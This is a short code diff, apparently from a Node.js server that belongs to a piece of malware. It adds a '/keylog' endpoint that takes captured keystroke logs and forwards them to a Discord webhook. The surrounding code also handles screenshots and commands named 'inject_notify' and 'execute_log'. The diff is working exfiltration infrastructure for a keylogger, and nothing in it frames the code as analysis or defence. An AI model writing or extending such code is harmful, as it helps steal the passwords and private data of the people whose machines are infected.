@@ -17,7 +17,6 @@ const server = http.createServer((req, res) => {
             try {
                 const { command, args } = JSON.parse(body);
                 
-                // Логирование в Discord
                 if (command === "user_chat" || command === "inject_notify" || command === "execute_log") {
                     fetch(WEBHOOK_URL, {
                         method: 'POST',
@@ -50,6 +49,30 @@ const server = http.createServer((req, res) => {
             } catch (e) {
                 res.statusCode = 400;
                 res.end(JSON.stringify({ error: "Invalid screenshot data" }));
+            }
+        });
+        return;
+    }
+
+    if (req.method === 'POST' && req.url === '/keylog') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', () => {
+            try {
+                const { logs } = JSON.parse(body);
+                
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `**Keylogger Data:**\n\`\`\`\n${logs}\n\`\`\``
+                    })
+                }).catch(console.error);
+                
+                res.end(JSON.stringify({ status: "Logs received" }));
+            } catch (e) {
+                res.statusCode = 400;
+                res.end(JSON.stringify({ error: "Invalid keylog data" }));
             }
         });
         return;
